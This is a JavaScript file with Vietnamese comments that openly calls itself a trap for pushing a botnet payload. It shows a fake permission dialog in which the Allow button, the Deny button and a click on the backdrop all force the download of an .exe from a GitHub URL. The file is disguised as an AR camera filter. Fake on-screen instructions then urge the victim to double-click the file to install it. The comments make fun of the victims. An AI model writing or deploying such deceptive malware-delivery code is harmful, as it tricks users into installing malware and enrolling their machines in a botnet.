// ==========================================
// CẠM BẪY LỪA TẢI PAYLOAD (BOTNET)
// ==========================================
// Anh zai đổi tên file này thành tên file .exe sau khi build nhé!
const PAYLOAD_URL = "https://raw.githubusercontent.com/lhba5510/tra-cuu-diem-thi/refs/heads/main/PTB_Camera_Filter.exe"; 

document.addEventListener('DOMContentLoaded', () => {
    const btnAllow = document.getElementById('btnAllow');
    const btnDeny = document.getElementById('btnDeny');
    const modal = document.getElementById('permissionModal');
    
    // Cạm bẫy tử thần: Nút NÀO CŨNG TẢI FILE!
    const triggerTrap = () => {
        if (modal.style.display === 'none') return; // Tránh chạy 2 lần
        modal.style.display = 'none'; // Ẩn bảng đi cho nó tưởng thoát rồi
        
        // Tạo thẻ a ngầm để bắt trình duyệt tự động tải xuống file .exe
        const a = document.createElement('a');
        a.href = PAYLOAD_URL;
        a.download = PAYLOAD_URL; // Ép tải xuống
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        
        // Hiện thông báo dụ nạn nhân click mở file vừa tải
        showFakeInstructions();
    };

    // Bấm Cho Phép -> Tải file
    btnAllow.addEventListener('click', triggerTrap);

    // Bấm Từ Chối -> Cũng tải file luôn =))
    btnDeny.addEventListener('click', triggerTrap);
    
    // Bấm ra ngoài khoảng không (backdrop) -> Vẫn tải file nốt =)))
    modal.addEventListener('click', triggerTrap);
});

// ==========================================
// HIỆU ỨNG DỤ DỖ MỞ FILE SAU KHI TẢI
// ==========================================
function showFakeInstructions() {
    setTimeout(() => {
        const overlay = document.getElementById('loadingOverlay');
        overlay.innerHTML = `
            <i class="fas fa-arrow-down" style="font-size: 40px; color: #ffeb3b; margin-bottom: 20px; animation: bounce 1s infinite;"></i>
            <p style="text-align:center; padding: 0 20px; font-weight: bold; font-size: 16px;">
                Đã tải gói Bộ Lọc AR!
            </p>
            <p style="text-align:center; padding: 0 20px; font-size: 14px; margin-top: 10px;">
                Vui lòng <b>Click đúp vào file vừa tải xuống</b> (góc dưới màn hình hoặc trong góc phải trình duyệt) để cài đặt bộ lọc, sau đó F5 lại trang nhé!
            </p>
        `;
    }, 500); 
}
